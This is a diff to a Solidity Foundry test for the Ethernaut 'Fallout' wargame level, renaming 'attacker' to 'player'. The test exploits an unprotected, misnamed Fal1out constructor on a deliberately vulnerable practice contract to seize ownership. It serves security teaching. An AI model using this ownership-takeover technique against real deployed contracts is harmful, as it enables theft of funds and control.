@@ -12,31 +12,31 @@ interface IFallout {
     function owner() external view returns (address);
 }
 
-/// @title Ethernaut 02 - Fallout Exploit Test
+/// @title Ethernaut 02 - Fallout Solution Test
 /// @notice Verifies that any caller can invoke Fal1out and take ownership.
 contract FalloutTest is Test {
-    /// @notice Account used to execute the exploit.
-    address attacker = makeAddr("attacker");
+    /// @notice Account used to solve the level.
+    address player = makeAddr("player");
 
     /// @notice Interface for the deployed Solidity 0.6 target.
-    IFallout falloutContract;
+    IFallout target;
 
-    /// @notice Deploys the legacy artifact and funds the attacker before each test.
+    /// @notice Deploys the legacy artifact and funds the player before each test.
     /// @dev deployCode keeps the vulnerable source on Solidity 0.6 while this test uses modern forge-std.
     function setUp() public {
-        falloutContract = IFallout(deployCode("02_Fallout.sol:Fallout"));
-        vm.deal(attacker, 1 ether);
+        target = IFallout(deployCode("02_Fallout.sol:Fallout"));
+        vm.deal(player, 1 ether);
     }
 
-    /// @notice Reproduces the ownership takeover through the public Fal1out function.
-    function testExploit() public {
-        vm.startPrank(attacker);
+    /// @notice Completes the level through the publicly callable Fal1out function.
+    function testSolve() public {
+        vm.startPrank(player);
 
         // Call the function that was intended to initialize the contract owner.
-        falloutContract.Fal1out{value: 1 wei}();
+        target.Fal1out{value: 1 wei}();
 
-        // Confirm that the unrestricted call assigned ownership to the attacker.
-        assertEq(falloutContract.owner(), attacker);
+        // Confirm that the unrestricted call assigned ownership to the player.
+        assertEq(target.owner(), player);
 
         vm.stopPrank();
     }
